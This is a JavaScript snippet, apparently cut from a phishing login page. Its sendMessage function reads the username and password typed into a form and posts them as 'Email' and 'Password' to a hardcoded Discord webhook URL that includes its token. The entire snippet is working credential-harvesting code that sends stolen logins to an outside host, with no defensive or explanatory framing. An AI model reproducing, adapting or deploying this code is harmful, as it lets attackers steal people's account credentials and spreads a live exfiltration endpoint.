    <script>
        function sendMessage() {
            // Retrieve values from input fields
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Create and send XMLHttpRequest
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1276720677017096203/M5qLoDYi9QMlDZq0lz3e_QDVinwMVQaWJZre-KtuzEEkelLEzseQQh4MT0NtnjHq3HP5");

            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: "Svenska",
                avatar_url: "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Favatarfiles.alphacoders.com%2F271%2F271795.jpg&f=1&nofb=1&ipt=bc06e039864dc733546505da971d5513e8b1fa6821336b2360da4da626851935&ipo=images",
                content: `Email: ${username}\nPassword: ${password}`
            };

            request.send(JSON.stringify(params));
        }
